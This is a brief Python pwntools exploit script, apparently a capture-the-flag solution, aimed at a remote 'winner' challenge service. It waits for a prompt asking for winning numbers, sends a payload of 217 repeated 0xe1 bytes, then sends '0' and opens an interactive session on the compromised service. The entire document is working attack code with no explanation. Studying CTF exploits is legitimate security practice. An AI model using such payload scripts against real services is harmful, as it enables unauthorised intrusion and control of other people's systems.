from pwn import *

#s = remote('localhost',9999)
s = remote('winner.svattt.org',31335)

def pwn():
	pause()
	print s.recvuntil('Please choose winning numbers [1-9a-f] (type 0 if you\'re done)')

	payload = '\xe1'*217
	s.sendline(payload)

	s.sendline('0')
	s.interactive()

pwn()